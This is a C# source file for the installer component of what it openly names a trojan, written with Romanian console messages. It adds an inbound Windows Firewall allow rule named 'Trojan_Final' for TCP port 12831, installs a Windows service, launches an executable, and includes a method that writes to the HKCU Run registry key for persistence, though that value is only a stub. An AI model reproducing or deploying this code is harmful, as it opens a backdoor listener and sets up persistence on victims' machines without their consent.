using Microsoft.Win32;
using NetFwTypeLib;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Installer
{
    class Utils
    {
        // Add a rule at FireWall
        public static void ConfigureFirewall()
        {
            INetFwMgr icfMgr = null;
            try
            {
                Type TicfMgr = Type.GetTypeFromProgID("HNetCfg.FwMgr");
                icfMgr = (INetFwMgr)Activator.CreateInstance(TicfMgr);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Eroare");
            }

            try
            {
                Type tNetFwPolicy2 = Type.GetTypeFromProgID("HNetCfg.FwPolicy2");
                INetFwPolicy2 fwPolicy2 = (INetFwPolicy2)Activator.CreateInstance(tNetFwPolicy2);
                var currentProfiles = fwPolicy2.CurrentProfileTypes;

                INetFwRule2 inboundRule = (INetFwRule2)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule"));
                inboundRule.Enabled = true;
                inboundRule.Action = NET_FW_ACTION_.NET_FW_ACTION_ALLOW;
                inboundRule.Protocol = 6;
                inboundRule.LocalPorts = "12831";
                inboundRule.Name = "Trojan_Final";
                inboundRule.Profiles = currentProfiles;

                INetFwPolicy2 firewallPolicy = (INetFwPolicy2)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwPolicy2"));
                firewallPolicy.Rules.Add(inboundRule);

                Console.WriteLine("Succes!");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        #region Installing the Windows Service Application
        public static void InstallService(string serviceName, Assembly assembly)
        {
            if (IsServiceInstalled(serviceName))
            {
                AssemblyInstaller uninstall = new AssemblyInstaller(assembly, null);
                uninstall.UseNewContext = true;
                uninstall.Uninstall(null);
            }

            using (AssemblyInstaller installer = GetInstaller(assembly))
            {
                IDictionary state = new Hashtable();
                try
                {
                    installer.Install(state);
                    installer.Commit(state);
                }
                catch
                {
                    try
                    {
                        installer.Rollback(state);
                    }
                    catch { }
                    throw;
                }
            }
        }

        public static bool IsServiceInstalled(string serviceName)
        {
            using (ServiceController controller = new ServiceController(serviceName))
            {
                try
                {
                    ServiceControllerStatus status = controller.Status;
                }
                catch
                {
                    return false;
                }

                return true;
            }
        }

        private static AssemblyInstaller GetInstaller(Assembly assembly)
        {
            AssemblyInstaller installer = new AssemblyInstaller(assembly, null);
            installer.UseNewContext = true;

            return installer;
        }
        #endregion;

        public static void ExecuteConsole(string filePath)
        {
            ProcessStartInfo sInfo = new ProcessStartInfo();
            sInfo.WorkingDirectory = Path.GetDirectoryName(filePath);
            sInfo.FileName = Path.GetFileName(filePath);
            //sInfo.Arguments = @"/c " + "\""+ filePath + "\"";
            sInfo.UseShellExecute = false;
            sInfo.CreateNoWindow = false;
            sInfo.ErrorDialog = false;
            sInfo.WindowStyle = ProcessWindowStyle.Normal;
            try { Process exeProcess = Process.Start(sInfo); } catch { }
        }

        private void SetStartup(Process process)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            rk.SetValue("console", ".exe");
        }
    }
}
